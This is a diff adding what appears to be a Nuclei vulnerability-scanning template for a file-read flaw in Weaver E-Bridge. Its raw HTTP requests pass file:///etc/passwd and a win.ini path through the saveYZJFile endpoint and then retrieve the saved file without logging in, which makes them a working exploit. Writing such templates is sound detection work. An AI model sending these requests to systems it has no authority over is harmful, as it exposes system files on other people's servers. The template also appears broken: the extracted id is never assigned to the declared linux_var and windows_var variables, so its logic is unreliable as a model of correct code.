@@ -1,0 +1,79 @@
+id: yaml-poc-weaver-weaver_e_bridge-readfile-CT-159019
+info:
+  name: Weaver E-Bridge File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template identifies a file read vulnerability in Weaver E-Bridge by attempting to access sensitive system files, such as `/etc/passwd` on Linux or `win.ini` on Windows, through an unsafe file download mechanism.
+  tags: file-read
+
+variables:
+  linux_var: ''
+  windows_var: ''
+
+http:
+  - raw:
+      - |
+        GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'application/json'
+      - type: regex
+        part: body
+        regex:
+          - '\"id\"\:\"(?P<var>.+?)\"\,'
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '\"id\"\:\"(?P<var>.+?)\"\,'
+        group: 1
+        internal: true
+
+  - raw:
+      - |
+        GET /file/fileNoLogin/{{linux_var}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:[x*]:0:0:'
+
+  - raw:
+      - |
+        GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'application/json'
+      - type: regex
+        part: body
+        regex:
+          - '\"id\"\:\"(?P<var>.+?)\"\,'
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '\"id\"\:\"(?P<var>.+?)\"\,'
+        group: 1
+        internal: true
+
+  - raw:
+      - |
+        GET /file/fileNoLogin/{{windows_var}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'for 16-bit app support'
+          - '\[extensions\]'
